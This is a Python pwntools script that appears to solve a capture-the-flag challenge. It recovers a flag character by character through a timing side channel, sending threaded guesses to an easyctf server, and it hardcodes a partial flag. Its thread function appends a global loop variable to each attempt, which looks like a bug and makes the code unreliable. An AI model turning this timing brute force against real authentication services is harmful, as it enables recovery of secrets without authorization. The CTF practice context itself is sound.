#! /usr/bin/env python3
##
from pwn import *
import string
import time
import queue
import threading

# Set variables
flag = "easyctf{ez_t1m1ng_4ttack!"

# Charset
cs = string.ascii_lowercase + string.digits + string.punctuation

# Set max time
maxed = 25
time_taken = maxed

# Create thread object
def tube_thread(queue, attempt):
    for i in range(2):
        try:
            with context.local(log_level = "critical"):
                t = remote("c1.easyctf.com", 12482)
            t.recvuntil("flag:")

            # Send current attempt
            t.sendline(attempt + c)

            # Get feedback
            start = time.time()
            t.recvline()
            end = time.time()
            time_taken = (end - start)

            # Close tube
            with context.local(log_level = "critical"):
                t.close()

            # Log
            log.info(f"Current Best: {repr(flag)} Attempting: {repr(attempt)} Time: {time_taken}")

            # Put back in queue
            queue.put((time_taken, attempt))
            break
        except Exception as e:
            print(f"[EXCEPTION] {e}")
            pass


# Start tube
with log.progress("Cracking NASA...") as p:
    while True:
        # Open a thread for each character
        threads = []
        results = queue.Queue()
        for c in cs:
            thread = threading.Thread(target=tube_thread, args=(results, flag + c))
            thread.start()
            threads.append(thread)

        # Rejoin
        for thread in threads:
            thread.join()

        # Get back from queue
        break_harder = False
        while not results.empty():
            time_taken, attempt = results.get()

            # If time taken is more than maxed
            if time_taken > (maxed + 1):
                flag = attempt
                maxed = time_taken
                log.success(f"Current Best: {repr(flag)} Attempting: {repr(flag + c)} Time: {time_taken}")
                break_harder = True
                break

        # Check if we stagnated / got flag
        if not break_harder:
            p.success(f"Flag Found! {flag}")
            log.success(f"Flag Found! {flag}")
            break

